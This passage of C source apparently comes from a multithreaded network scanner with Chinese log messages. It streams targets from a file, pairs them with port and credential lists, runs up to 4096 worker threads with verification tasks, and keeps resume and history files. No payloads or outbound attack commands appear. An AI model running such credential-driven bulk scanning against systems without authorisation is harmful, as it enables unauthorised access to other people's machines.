    init_locks();

    if (!targets_file || !*targets_file) {
        printf("[错误] 目标文件为空，无法开始扫描\n");
        return;
    }

    MUTEX_LOCK(lock_stats);
    while (verify_head) {
        verify_task_t *next = verify_head->next;
        free(verify_head);
        verify_head = next;
    }
    verify_tail = NULL;
    verify_running_threads = 0;
    pending_verify_tasks = 0;
    feeding_in_progress = 0;
    snprintf(progress_token, sizeof(progress_token), "-");
    MUTEX_UNLOCK(lock_stats);

    /* 快速估算总目标数 — 文件流式读取，不整体加载到内存 */
    size_t est_total = scanner_estimate_targets_from_file(targets_file);
    printf("开始扫描... 预估目标: %zu, 总端口: %zu\n", est_total, port_count);

    feed_context_t feed_ctx;
    feed_ctx.creds = creds;
    feed_ctx.cred_count = cred_count;
    feed_ctx.ports = ports;
    feed_ctx.port_count = port_count;
    feed_ctx.fed_count = 0;
    feed_ctx.est_total = est_total;
    if (!g_skip_cache_ready || g_state.total_scanned == 0) {
        target_set_free(&g_resume_cache);
        target_set_free(&g_history_cache);
        memset(&g_resume_cache, 0, sizeof(g_resume_cache));
        memset(&g_history_cache, 0, sizeof(g_history_cache));

        g_skip_cache_resume_enabled = 0;
        g_skip_cache_history_enabled = 0;

        if (g_config.resume_enabled && target_set_init(&g_resume_cache, 131071) == 0) {
            g_skip_cache_resume_enabled = 1;
        }

        if (g_skip_cache_resume_enabled) {
            char resume_file[MAX_PATH_LENGTH];
            snprintf(resume_file, sizeof(resume_file), "%s/resume_targets.chk", g_config.base_dir);
            load_target_set_file(resume_file, &g_resume_cache);
        }

        if (g_config.skip_scanned && target_set_init(&g_history_cache, 131071) == 0) {
            char history_file[MAX_PATH_LENGTH];
            snprintf(history_file, sizeof(history_file), "%s/scanned_history.log", g_config.base_dir);
            long long hsize = file_size_bytes(history_file);
            if (hsize >= 0 && hsize <= (20LL * 1024 * 1024)) {
                g_skip_cache_history_enabled = 1;
                load_target_set_file(history_file, &g_history_cache);
            } else {
                g_skip_cache_history_enabled = 0;
            }
        }

        g_skip_cache_ready = 1;
    }

    feed_ctx.resume_done = g_skip_cache_resume_enabled ? &g_resume_cache : NULL;
    feed_ctx.history_done = g_skip_cache_history_enabled ? &g_history_cache : NULL;
    feed_ctx.skipped_resume = 0;
    feed_ctx.skipped_history = 0;
    feed_ctx.enable_resume_skip = g_skip_cache_resume_enabled;
    feed_ctx.enable_history_skip = g_skip_cache_history_enabled;
    snprintf(feed_ctx.resume_checkpoint_file, sizeof(feed_ctx.resume_checkpoint_file), "%s/resume_targets.chk", g_config.base_dir);
    snprintf(feed_ctx.history_file, sizeof(feed_ctx.history_file), "%s/scanned_history.log", g_config.base_dir);
    snprintf(feed_ctx.progress_file, sizeof(feed_ctx.progress_file), "%s/scan_progress.dat", g_config.base_dir);
    snprintf(feed_ctx.targets_file, sizeof(feed_ctx.targets_file), "%s", targets_file);
    feed_ctx.current_ip[0] = '\0';
    feed_ctx.current_port = 0;
    feed_ctx.last_progress_write_ms = 0;

    MUTEX_LOCK(lock_stats);
    feeding_in_progress = 1;
    MUTEX_UNLOCK(lock_stats);

    /* skip caches are preloaded once per audit session */
    write_scan_progress(&feed_ctx, "running");

    size_t worker_count = (size_t)clamp_positive_threads(g_config.threads);
    if (worker_count > 4096) worker_count = 4096;
    worker_arg_pool_prefill(SCAN_TASK_QUEUE_CAP + worker_count + 64);
    scan_queue_reset();
    MUTEX_LOCK(lock_stats);
    g_scan_worker_total = (int)worker_count;
    MUTEX_UNLOCK(lock_stats);

    stream_producer_ctx_t pctx;
    pctx.targets_file = targets_file;
    pctx.ctx = &feed_ctx;

#ifdef _WIN32
    HANDLE *worker_handles = (HANDLE *)calloc(worker_count, sizeof(HANDLE));
    size_t worker_started = 0;
    for (size_t i = 0; i < worker_count; i++) {
        uintptr_t h = _beginthreadex(NULL, 0, scanner_stream_worker, NULL, 0, NULL);
        if (h == 0) break;
        worker_handles[worker_started++] = (HANDLE)h;
        if ((worker_started % 20) == 0) saia_sleep(5);
    }

    if (worker_started == 0) {
        printf("[错误] 未能创建扫描工作线程\n");
        MUTEX_LOCK(lock_stats);
        g_scan_producer_done = 1;
        MUTEX_UNLOCK(lock_stats);
    } else {
        uintptr_t producer_h = _beginthreadex(NULL, 0, scanner_stream_producer, &pctx, 0, NULL);
        if (producer_h != 0) {
            WaitForSingleObject((HANDLE)producer_h, INFINITE);
            CloseHandle((HANDLE)producer_h);
        } else {
            MUTEX_LOCK(lock_stats);
            g_scan_producer_done = 1;
            MUTEX_UNLOCK(lock_stats);
        }
    }

    for (size_t i = 0; i < worker_started; i++) {
        WaitForSingleObject(worker_handles[i], INFINITE);
        CloseHandle(worker_handles[i]);
    }
    free(worker_handles);
#else
    pthread_t *workers = (pthread_t *)calloc(worker_count, sizeof(pthread_t));
    size_t worker_started = 0;
    for (size_t i = 0; i < worker_count; i++) {
        if (pthread_create(&workers[i], NULL, scanner_stream_worker, NULL) != 0) break;
        worker_started++;
        if ((worker_started % 20) == 0) saia_sleep(5);
    }

    if (worker_started == 0) {
        printf("[错误] 未能创建扫描工作线程\n");
        MUTEX_LOCK(lock_stats);
        g_scan_producer_done = 1;
        MUTEX_UNLOCK(lock_stats);
    } else {
        pthread_t producer_tid;
        if (pthread_create(&producer_tid, NULL, scanner_stream_producer, &pctx) == 0) {
            pthread_join(producer_tid, NULL);
        } else {
            MUTEX_LOCK(lock_stats);
            g_scan_producer_done = 1;
            MUTEX_UNLOCK(lock_stats);
        }
    }

    for (size_t i = 0; i < worker_started; i++) {
        pthread_join(workers[i], NULL);
    }
    free(workers);
#endif

    MUTEX_LOCK(lock_stats);
    feeding_in_progress = 0;
    MUTEX_UNLOCK(lock_stats);

    /* 等待剩余线程 */
    while (1) {
        scanner_pump_verify_workers();
        MUTEX_LOCK(lock_stats);
        int remaining = running_threads;
        int verifying = verify_running_threads;
        int queued = pending_verify_tasks;
        MUTEX_UNLOCK(lock_stats);
        if (remaining <= 0 && verifying <= 0 && queued <= 0) break;
        saia_sleep(200);
    }

    printf("\n扫描结束\n");
    const char *final_status = (g_running && !g_reload) ? "completed" : "stopped";
    if (g_running && !g_reload && feed_ctx.est_total > 0 && feed_ctx.fed_count == 0 &&
        (feed_ctx.skipped_resume > 0 || feed_ctx.skipped_history > 0)) {
        final_status = "completed_skipped";
    }
    write_scan_progress(&feed_ctx, final_status);

    if (feed_ctx.skipped_resume > 0 || feed_ctx.skipped_history > 0) {
        printf("跳过统计 -> resume:%d history:%d\n", feed_ctx.skipped_resume, feed_ctx.skipped_history);
    }

    /* keep skip caches alive across port batches */
}

// 占位符接口实现
int scanner_init(void) {
    if (g_report_fp) {
        fclose(g_report_fp);
        g_report_fp = NULL;
    }
    if (g_config.report_file[0]) {
        snprintf(g_report_path, sizeof(g_report_path), "%s", g_config.report_file);
    } else {
        snprintf(g_report_path, sizeof(g_report_path), "%s/audit_report.log", g_config.base_dir);
    }
    g_report_fp = fopen(g_report_path, "a");
    return 0;
}
void scanner_cleanup(void) {
    MUTEX_LOCK(lock_stats);
    while (verify_head) {
        verify_task_t *next = verify_head->next;
        free(verify_head);
        verify_head = next;
    }
    verify_tail = NULL;
    pending_verify_tasks = 0;
    verify_running_threads = 0;
    feeding_in_progress = 0;
    snprintf(progress_token, sizeof(progress_token), "-");
    MUTEX_UNLOCK(lock_stats);

    while (g_worker_arg_pool) {
        worker_arg_pool_t *next = g_worker_arg_pool->next;
        free(g_worker_arg_pool);
        g_worker_arg_pool = next;
    }
    g_worker_arg_pool_size = 0;
    g_scan_q_head = g_scan_q_tail = g_scan_q_size = 0;
    g_scan_producer_done = 0;

    target_set_free(&g_resume_cache);
    target_set_free(&g_history_cache);
    memset(&g_resume_cache, 0, sizeof(g_resume_cache));
    memset(&g_history_cache, 0, sizeof(g_history_cache));
    g_skip_cache_ready = 0;
    g_skip_cache_resume_enabled = 0;
    g_skip_cache_history_enabled = 0;

    if (g_report_fp) {
        fflush(g_report_fp);
        fclose(g_report_fp);
        g_report_fp = NULL;
    }
}
// scanner_run 已经被新的逻辑替代，这里仅保留兼容性
int scanner_run(scan_target_t *target) { 
    (void)target;
    return 0; 
}
int scanner_scan_port(ip_port_t addr, scan_result_t *result) { (void)addr; (void)result; return 0; }
int scanner_scan_callback(scan_result_t *result, void *user_data) { (void)result; (void)user_data; return 0; }
